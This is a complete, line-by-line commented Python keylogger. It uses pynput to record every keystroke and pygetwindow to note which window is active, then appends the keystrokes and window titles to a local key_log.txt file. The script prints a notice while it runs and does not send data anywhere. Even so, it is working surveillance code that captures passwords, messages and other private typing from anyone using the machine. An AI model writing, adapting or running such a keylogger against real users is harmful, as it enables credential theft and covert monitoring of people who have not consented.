# Import the keyboard module from pynput to capture key events
from pynput import keyboard

# Import pygetwindow to get the title of the currently active window
import pygetwindow as gw

# Import time module for sleep functionality
import time

# Define the file name where the key logs will be saved
log_file = "key_log.txt"

# Initialize the last active window title as an empty string
last_window = ""

# Dictionary to map special keys to human-readable strings
SPECIAL_KEYS = {
    'Key.enter': '[ENTER]\n',
    'Key.space': ' ',
    'Key.tab': '[TAB]',
    'Key.backspace': '[BACKSPACE]',
    'Key.shift': '[SHIFT]',
    'Key.shift_r': '[SHIFT]',
    'Key.ctrl_l': '[CTRL]',
    'Key.ctrl_r': '[CTRL]',
    'Key.alt_l': '[ALT]',
    'Key.alt_r': '[ALT]',
    'Key.caps_lock': '[CAPSLOCK]',
    'Key.esc': '[ESC]',
    'Key.delete': '[DEL]'
}

# Function to get the title of the currently active window
def get_active_window_title():
    try:
        # Try to get the active window title
        return gw.getActiveWindow().title
    except:
        # If there's an error (e.g., no active window), return an empty string
        return ""

# Function that is called whenever a key is pressed
def on_press(key):
    global last_window  # Declare the last_window variable as global to modify it inside the function

    # Get the current active window title
    current_window = get_active_window_title()

    # If the active window changed since last key press
    if current_window and current_window != last_window:
        # Update the last_window to the new active window
        last_window = current_window
        # Open the log file in append mode with UTF-8 encoding
        with open(log_file, "a", encoding="utf-8") as f:
            # Write a header noting the window switch in the log file
            f.write(f"\n\n-------- Switched to: {current_window} --------\n")

    # Try to log regular character keys
    try:
        # Open the log file in append mode with UTF-8 encoding
        with open(log_file, "a", encoding="utf-8") as f:
            # Write the character of the pressed key to the log file
            f.write(str(key.char))
    except AttributeError:
        # If the key doesn't have a 'char' attribute (special key), handle separately
        special = str(key)  # Convert the key to string form (e.g., Key.enter)
        if special in SPECIAL_KEYS:
            # If the key is in our special key mapping
            with open(log_file, "a", encoding="utf-8") as f:
                # Write the mapped special key string
                f.write(SPECIAL_KEYS[special])
        else:
            # If the special key isn't mapped, log it in uppercase within brackets
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"[{special.upper()}]")

# Create a keyboard listener that runs the on_press function when keys are pressed
listener = keyboard.Listener(on_press=on_press)

# Start the listener in the background
listener.start()

# Print a message to the terminal indicating the keylogger is active
print("Keylogger is running. Press Ctrl+C in terminal to stop.")

# Try to keep the program running
try:
    while True:
        # Sleep to prevent high CPU usage in the loop
        time.sleep(1)
except KeyboardInterrupt:
    # If Ctrl+C is pressed in the terminal, catch the interrupt
    print("\nKeylogger stopped.")
    # Stop the keyboard listener
    listener.stop()
